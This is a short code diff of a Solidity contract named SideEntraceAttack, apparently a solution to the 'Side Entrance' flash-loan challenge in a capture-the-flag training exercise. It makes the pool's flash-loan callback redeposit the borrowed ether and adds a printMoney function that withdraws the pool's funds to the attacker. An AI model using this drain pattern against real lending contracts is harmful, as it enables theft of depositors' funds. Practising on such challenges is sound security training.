@@ -34,8 +34,8 @@ contract SideEntraceAttack {
         
     }
 
-    function execute(uint256 amount){
-         borrower.functionCallWithValue(
+    function execute(uint256 amount) external {
+         pool.functionCallWithValue(
             abi.encodeWithSignature(
                 "deposit()"
             ),
@@ -44,7 +44,7 @@ contract SideEntraceAttack {
                 //address(pool).deposit().sendValue(amount);
     }
 
-    function printMoney(){
+    function printMoney() external {
         pool.withdraw();
         address(attacker).send(balance);
 
